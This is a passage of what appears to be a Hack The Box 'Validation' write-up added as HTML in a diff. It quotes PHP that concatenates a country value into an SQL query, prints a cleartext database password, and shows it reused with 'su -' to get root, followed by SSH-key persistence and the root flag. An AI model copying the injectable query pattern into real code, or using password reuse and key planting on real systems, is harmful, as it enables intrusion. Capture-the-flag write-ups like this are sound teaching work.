+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>stmt</span><span class="z-meta z-function-call z-method z-php"><span class="z-punctuation z-accessor z-arrow z-php">-&gt;</span><span class="z-variable z-function z-php">execute</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>result</span> <span class="z-keyword z-operator z-assignment z-php">=</span> <span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>stmt</span><span class="z-meta z-function-call z-method z-php"><span class="z-punctuation z-accessor z-arrow z-php">-&gt;</span><span class="z-variable z-function z-php">get_result</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span><span class="z-punctuation z-terminator z-expression z-php">;</span> <span class="z-comment z-line z-double-slash z-php"><span class="z-punctuation z-definition z-comment z-php">//</span> get the mysqli result
+</span></span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>row</span>    <span class="z-keyword z-operator z-assignment z-php">=</span> <span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>result</span><span class="z-meta z-function-call z-method z-php"><span class="z-punctuation z-accessor z-arrow z-php">-&gt;</span><span class="z-variable z-function z-php">fetch_assoc</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span><span class="z-punctuation z-terminator z-expression z-php">;</span> <span class="z-comment z-line z-double-slash z-php"><span class="z-punctuation z-definition z-comment z-php">//</span> fetch data
+</span></span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-support z-function z-construct z-php">echo</span> <span class="z-string z-quoted z-single z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&#39;</span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php"></span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php">&lt;h1 class=&quot;text-white&quot;&gt;Welcome </span><span class="z-punctuation z-definition z-string z-end z-php">&#39;</span></span> <span class="z-keyword z-operator z-string z-php">.</span> <span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>row</span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-begin z-php">[</span></span><span class="z-meta z-item-access z-arguments z-php"><span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&quot;</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php">username</span><span class="z-punctuation z-definition z-string z-end z-php">&quot;</span></span></span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-end z-php">]</span></span> <span class="z-keyword z-operator z-string z-php">.</span> <span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&quot;</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php">&lt;/h1&gt;</span><span class="z-punctuation z-definition z-string z-end z-php">&quot;</span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-support z-function z-construct z-php">echo</span> <span class="z-string z-quoted z-single z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&#39;</span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php"></span></span><span class="z-string z-quoted z-single z-php"><span class="z-meta z-string-contents z-quoted z-single z-php">&lt;h3 class=&quot;text-white&quot;&gt;Other Players In </span><span class="z-punctuation z-definition z-string z-end z-php">&#39;</span></span> <span class="z-keyword z-operator z-string z-php">.</span> <span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>row</span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-begin z-php">[</span></span><span class="z-meta z-item-access z-arguments z-php"><span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&quot;</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php">country</span><span class="z-punctuation z-definition z-string z-end z-php">&quot;</span></span></span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-end z-php">]</span></span> <span class="z-keyword z-operator z-string z-php">.</span> <span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&quot;</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php">&lt;/h3&gt;</span><span class="z-punctuation z-definition z-string z-end z-php">&quot;</span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>sql</span>    <span class="z-keyword z-operator z-assignment z-php">=</span> <span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&quot;</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"><span class="z-source z-sql"><span class="z-keyword z-other z-DML z-sql">SELECT</span> username <span class="z-keyword z-other z-DML z-sql">FROM</span> registration <span class="z-keyword z-other z-DML z-sql">WHERE</span> country <span class="z-keyword z-operator z-comparison z-sql">=</span> <span class="z-string z-quoted z-single z-sql"><span class="z-punctuation z-definition z-string z-begin z-sql">&#39;</span></span></span></span><span class="z-punctuation z-definition z-string z-end z-php">&quot;</span></span> <span class="z-keyword z-operator z-string z-php">.</span> <span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>row</span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-begin z-php">[</span></span><span class="z-meta z-item-access z-arguments z-php"><span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&quot;</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php">country</span><span class="z-punctuation z-definition z-string z-end z-php">&quot;</span></span></span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-end z-php">]</span></span> <span class="z-keyword z-operator z-string z-php">.</span> <span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&quot;</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php">&#39;</span><span class="z-punctuation z-definition z-string z-end z-php">&quot;</span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>result</span> <span class="z-keyword z-operator z-assignment z-php">=</span> <span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>conn</span><span class="z-meta z-function-call z-method z-php"><span class="z-punctuation z-accessor z-arrow z-php">-&gt;</span><span class="z-variable z-function z-php">query</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>sql</span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-keyword z-control z-php">while</span> <span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span><span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>row</span> <span class="z-keyword z-operator z-assignment z-php">=</span> <span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>result</span><span class="z-meta z-function-call z-method z-php"><span class="z-punctuation z-accessor z-arrow z-php">-&gt;</span><span class="z-variable z-function z-php">fetch_assoc</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span><span class="z-punctuation z-section z-group z-end z-php">)</span></span> <span class="z-punctuation z-section z-block z-begin z-php">{</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">    <span class="z-support z-function z-construct z-php">echo</span> <span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&quot;</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php">&lt;li class=&#39;text-white&#39;&gt;</span><span class="z-punctuation z-definition z-string z-end z-php">&quot;</span></span> <span class="z-keyword z-operator z-string z-php">.</span> <span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>row</span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-begin z-php">[</span></span><span class="z-meta z-item-access z-arguments z-php"><span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&quot;</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php">username</span><span class="z-punctuation z-definition z-string z-end z-php">&quot;</span></span></span><span class="z-meta z-item-access z-php"><span class="z-punctuation z-section z-brackets z-end z-php">]</span></span> <span class="z-keyword z-operator z-string z-php">.</span> <span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&quot;</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php">&lt;/li&gt;</span><span class="z-punctuation z-definition z-string z-end z-php">&quot;</span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-punctuation z-section z-block z-end z-php">}</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"></span><span class="z-punctuation z-section z-embedded z-end z-php">?&gt;</span><span class="z-meta z-html-newline-after-php z-php">
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-tag z-other z-html"><span class="z-punctuation z-definition z-tag z-begin z-html">&lt;</span></span><span class="z-meta z-tag z-other z-html"><span class="z-entity z-name z-tag z-other z-html">SNIP</span><span class="z-punctuation z-definition z-tag z-end z-html">&gt;</span></span>
+</span></span></code></pre>
+<p>The <code>account.php</code> file is responsible for showing all the registered players
+with the same country. In fact, it reads the username hash of the user from the
+request <code>user</code> cookie, fetches all the players who registered with the same
+country, and shows the result.</p>
+<pre data-lang="php" class="language-php z-code"><code class="language-php" data-lang="php"><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-punctuation z-section z-embedded z-begin z-php">&lt;?php</span></span><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>servername</span> <span class="z-keyword z-operator z-assignment z-php">=</span> <span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&quot;</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php">127.0.0.1</span><span class="z-punctuation z-definition z-string z-end z-php">&quot;</span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>username</span>   <span class="z-keyword z-operator z-assignment z-php">=</span> <span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&quot;</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php">uhc</span><span class="z-punctuation z-definition z-string z-end z-php">&quot;</span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>password</span>   <span class="z-keyword z-operator z-assignment z-php">=</span> <span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&quot;</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php">uhc-9qual-global-pw</span><span class="z-punctuation z-definition z-string z-end z-php">&quot;</span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>dbname</span>     <span class="z-keyword z-operator z-assignment z-php">=</span> <span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&quot;</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php">registration</span><span class="z-punctuation z-definition z-string z-end z-php">&quot;</span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>conn</span> <span class="z-keyword z-operator z-assignment z-php">=</span> <span class="z-keyword z-other z-new z-php">new</span> <span class="z-meta z-path z-php"><span class="z-support z-class z-builtin z-php">mysqli</span></span><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span><span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>servername</span>, <span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>username</span>, <span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>password</span>, <span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>dbname</span><span class="z-punctuation z-section z-group z-end z-php">)</span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"></span><span class="z-punctuation z-section z-embedded z-end z-php">?&gt;</span><span class="z-meta z-html-newline-after-php z-php"> 
+</span></span></span></span></code></pre>
+<p>The <code>config.php</code> file is included in the previous two PHP files we inspected,
+since it holds the configuration for the MariaDB requests! It also shows in
+cleartext the password used to connect to the database!</p>
+<h2 id="privilege-escalation-impersonation">Privilege escalation (Impersonation)</h2>
+<p>I tried the <code>uhc-9qual-global-pw</code> password to connect to Validation over SSH as
+<code>root</code>, but it failed.</p>
+<p>However, if we try it to impersonate <code>root</code> on the system...</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">www-data@validation:/var/www/html$</span></span><span class="z-meta z-function-call z-arguments z-shell"> su -</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">Password: uhc-9qual-global-pw
+</span><span class="z-text z-plain">root@validation:~#
+</span></code></pre>
+<p>It works!</p>
+<h3 id="establishing-persistence">Establishing persistence</h3>
+<p>Let's use SSH to establish persistence.</p>
+<p>Our home folder contains a <code>.ssh</code> folder. There's no existing private key, so
+I'll create one, and I'll add the corresponding public key to <code>authorized_keys</code>.
+Finally, I'll connect over SSH to Validation as <code>root</code>.</p>
+<h2 id="system-enumeration-1">System enumeration</h2>
+<p>If we run <code>whoami</code>, we see that we're <code>root</code>!</p>
+<h3 id="flags-1">Flags</h3>
+<p>As usual, we can find the root flag in our home folder.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">root@validation:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>#</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/root/root.txt<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">3fa34b1ae338017aa7dae70cdf12d07e
+</span></code></pre>
+<h1 id="afterwords">Afterwords</h1>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/validation/success.png" alt="Success" /></p>
+<p>That's it for this box! 🎉</p>
+<p>I rated the user flag as 'Easy' and the root flag as 'Very easy'. The foothold
+was quite easy to find and to exploit. The privilege escalation was also very
+easy to find since it only required proper enumeration, but having the idea of
+directly impersonating <code>root</code> on the system was slightly harder.</p>
+<p>Thanks for reading!</p>
+</section>
+</article>
+
+    </main>
+
+        <footer></footer>
+
+    </body>
+</html>
